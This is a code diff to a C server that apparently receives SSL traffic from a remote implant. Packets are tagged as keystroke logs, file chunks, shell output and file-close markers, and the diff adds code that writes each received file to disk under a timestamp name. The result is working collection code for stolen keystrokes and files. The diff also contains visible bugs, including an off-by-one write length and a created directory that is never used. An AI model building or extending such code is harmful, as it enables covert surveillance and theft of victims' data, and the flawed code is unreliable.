@@ -20,6 +20,9 @@
 #include <stdlib.h>
 #include <string.h>
 #include <sys/socket.h>
+#include <sys/stat.h>
+#include <sys/time.h>
+#include <sys/types.h>
 #include <termios.h>
 #include <unistd.h>
 
@@ -129,6 +132,12 @@ retry_ssl:
                 perror("keystroke log");
                 exit(EXIT_FAILURE);
             }
+            const char* file_dir = "server_files";
+            if (mkdir(file_dir, 0777)) {
+                perror("mkdir");
+                exit(EXIT_FAILURE);
+            }
+            FILE* outfile = NULL;
             int size;
             while ((size = SSL_read(ssl, buffer, MAX_PAYLOAD)) > 0) {
                 //printf("Got %d bytes\n", size);
@@ -141,6 +150,23 @@ retry_ssl:
                 } else if (buffer[0] == 'f') {
                     printf("Got %d bytes of a file\n", size);
                     fflush(stdout);
+                    if (!outfile) {
+                        //Create outfile here
+                        char outfilename[65535];
+                        struct timeval t;
+                        if (gettimeofday(&t, NULL)) {
+                            perror("gettimeofday");
+                            exit(EXIT_FAILURE);
+                        }
+                        sprintf(outfilename, "%lu%lu", t.tv_sec, t.tv_usec);
+                        outfile = fopen(outfilename, "wb");
+                        if (!outfile) {
+                            perror("fopen outfile");
+                            exit(EXIT_FAILURE);
+                        }
+                    }
+                    //Write to outfile
+                    fwrite(buffer + 1, 1, size, outfile);
                 } else if (buffer[0] == 's') {
                     for (int i = 1; i < size; ++i) {
                         printf("%c", buffer[i]);
@@ -149,6 +175,26 @@ retry_ssl:
                 } else if (buffer[0] == 'r') {
                     printf("Got %d bytes of a file close packet\n", size);
                     fflush(stdout);
+
+                    if (!outfile) {
+                        //Create outfile here
+                        char outfilename[65535];
+                        struct timeval t;
+                        if (gettimeofday(&t, NULL)) {
+                            perror("gettimeofday");
+                            exit(EXIT_FAILURE);
+                        }
+                        sprintf(outfilename, "%lu%lu", t.tv_sec, t.tv_usec);
+                        outfile = fopen(outfilename, "wb");
+                        if (!outfile) {
+                            perror("fopen outfile");
+                            exit(EXIT_FAILURE);
+                        }
+                    }
+                    //Write to outfile
+                    fwrite(buffer + 1, 1, size, outfile);
+                    fclose(outfile);
+                    outfile = NULL;
                 } else {
                     printf("Received %d bytes of unknown data\n", size);
 #if 1
